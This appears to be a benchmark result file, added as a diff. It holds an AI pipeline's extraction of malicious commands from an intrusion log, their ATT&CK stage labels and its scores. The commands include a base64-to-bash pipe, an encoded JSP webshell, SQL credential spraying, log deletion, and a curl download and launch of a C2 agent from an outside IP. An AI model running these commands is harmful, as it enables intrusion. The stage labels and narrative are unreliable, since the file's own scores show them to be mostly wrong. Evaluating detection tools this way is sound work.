@@ -1,0 +1,122 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "start:1185e211-d897-42e4-bb2d-7260f0eba801",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": ".\\/sqltool_amd64_upx \\--server 192\\.168\\.0\\.244 \\--user sa \\--password Sa123456 \\--exec whoami",
+        "stage": "Collection"
+      },
+      {
+        "command": "sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "chmod 700 /root/.vscode-server/.token",
+        "stage": "Persistence"
+      },
+      {
+        "command": "base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "chmod 0700 /root/.vscode-server/.token",
+        "stage": "Persistence"
+      },
+      {
+        "command": "echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9...",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c 'echo /root/.vscode-server/.token'",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "whoami",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "04-ifupdown -e /etc/NetworkManager/dispatcher.d/04-ifupdown eth0 dhcp4-change",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "20-chrony /etc/NetworkManager/dispatcher.d/20-chrony eth0 dhcp4-change",
+        "stage": "Discovery"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux; nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "A sophisticated attack was identified involving several sources. It began with an initial foothold achieved through exploiting vulnerabilities in the Tomcat web application. From there, the adversaries defended themselves by deleting auditor logs. Simultaneously, they pursued credential harvesting through various strategies, eventually accessing sensitive tokens. This laid the groundwork for persistence by changing file permissions. To expand their reach, they leveraged existing scripts such as cron jobs and Network Manager dispatcher scripts. As they moved around the network, they conducted discovery operations and established a lateral movement capability. Further analysis revealed instances where they interacted with an IP address over the internet, demonstrating command and control activities.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43919,
+      "completion_tokens": 6746,
+      "total_tokens": 50665,
+      "wall_clock_s": 84.585,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2222222222222222,
+      "recall": 0.5,
+      "f1": 0.30769230769230765,
+      "tp": 4,
+      "fp": 14,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.05555555555555555,
+      "recall": 0.14285714285714285,
+      "f1": 0.08,
+      "tp": 1,
+      "fp": 17,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43919,
+      "completion_tokens": 6746,
+      "total_tokens": 50665,
+      "wall_clock_s": 84.585,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
